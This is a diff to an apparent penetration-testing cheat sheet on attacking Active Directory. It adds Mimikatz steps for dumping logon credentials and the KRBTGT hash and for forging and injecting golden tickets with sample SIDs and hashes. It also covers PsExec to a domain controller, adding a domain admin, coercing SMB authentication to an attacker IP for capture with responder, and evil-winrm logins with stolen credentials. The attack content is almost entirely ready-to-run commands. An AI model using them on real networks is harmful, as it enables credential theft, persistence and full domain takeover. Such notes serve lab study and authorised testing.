@@ -91,7 +91,42 @@ Run ```whoami /all``` to get all the privileges of the current user.
 
 Mimikatz
 ```
+# Dump credentials
+mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # sekurlsa::logonpasswords
+```
+```
+# Golden ticket information - Dump SID and KRBTGT hash (on DC)
+mimikatz # privilege::debug
+mimikatz # token::elevate (DONT NEED THIS)
+mimikatz # lsadump::lsa /patch
+```
 
+```
+# Create golden ticket (write to file in this case)
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424454709-3473652537-2193885599 /krbtgt:4199649f577fc4f17791600916044e88 /ticket:golden
+```
+
+```
+# Super golden ticket
+kerberos::golden /user:<username> /domain:<domain> /sid:S-1-5-21-424564709-3573252527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:<ticket-name> /endin:2147483647
+```
+
+```
+# Inject ticket to memory
+mimikatz # kerberos::ptt golden
+# PsExec to DC
+PsExec64.exe <dc-name> cmd.exe
+```
+
+Net user/group
+```
+# Adding a domain admin
+net user <username> <password> /add /domain
+net group "domain admins" <username> /add /domain
 ```
 
 
@@ -163,7 +198,7 @@ xp_cmdshell whoami
 
 In the mssqlclient shell:
 ```
-xp_dirtree "\\<our-ip>\<random-share-name>" &
+xp_dirtree "\\<our-ip>\<random-share-name>" 
 ```
 In attacker machine:
 ```
@@ -203,11 +238,12 @@ responder -I tun0 -v
 ```
 - After that upload the filename.url file into the smb server, and see the output of the responder.
 
-- Another keep take away from the video is the use of Evil-WinRM if we are able to get any credentials of a user in the AD.
+- Another key take away from the video is the use of Evil-WinRM if we are able to get any credentials of a user in the AD.
 ```
 evil-winrm -i $IP -u $username -p $passwd
 ```
 - After getting a shell onto the box, run the basic command ``whoami /priv`` which is equivalent to ``sudo -l`` in linux.
+- Also run ``whoami /groups``
 - Reference: [PrivEsc w/ SharpGPOAbuse - Vault Walkthrough with S1REN - (PG-Practice) (Hack-A-Thon)](https://www.youtube.com/watch?v=JocbrhLXuss&t=3995)
 - If we see most of the Privilege is enabled we can use PowerView.
 - For PrivEsc we use **powerview.ps1** inorder to get the Group Policy of the Domain  
